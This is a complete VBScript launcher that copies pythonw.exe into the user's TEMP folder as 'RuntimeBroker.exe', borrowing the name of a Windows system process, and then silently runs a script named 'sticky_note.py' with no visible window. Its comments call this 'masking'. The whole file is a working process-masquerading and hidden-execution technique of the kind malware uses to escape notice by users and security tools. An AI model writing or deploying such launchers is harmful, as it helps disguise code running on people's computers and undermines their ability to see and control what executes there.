Set fso      = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

Dim strDir, strScript, strTemp, strMasked, strPythonW
Dim strLocal, folder, candidate

strDir    = fso.GetParentFolderName(WScript.ScriptFullName)
strScript = fso.BuildPath(strDir, "sticky_note.py")
strTemp   = WshShell.ExpandEnvironmentStrings("%TEMP%")
strMasked = strTemp & "\RuntimeBroker.exe"

' ─── Find pythonw.exe ─────────────────────────────────────────────────────
strPythonW = ""
strLocal   = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Programs\Python"

On Error Resume Next
If fso.FolderExists(strLocal) Then
    For Each folder In fso.GetFolder(strLocal).SubFolders
        candidate = folder.Path & "\pythonw.exe"
        If fso.FileExists(candidate) Then
            strPythonW = candidate
        End If
    Next
End If
On Error GoTo 0

' ─── Copy to RuntimeBroker.exe & launch ───────────────────────────────────
If strPythonW <> "" Then
    On Error Resume Next
    If Not fso.FileExists(strMasked) Then
        fso.CopyFile strPythonW, strMasked, True
    End If
    On Error GoTo 0

    If fso.FileExists(strMasked) Then
        WshShell.Run """" & strMasked & """ """ & strScript & """", 0, False
    Else
        WshShell.Run """" & strPythonW & """ """ & strScript & """", 0, False
    End If
Else
    ' Fallback: use pythonw from PATH (no masking)
    WshShell.Run "pythonw.exe """ & strScript & """", 0, False
End If
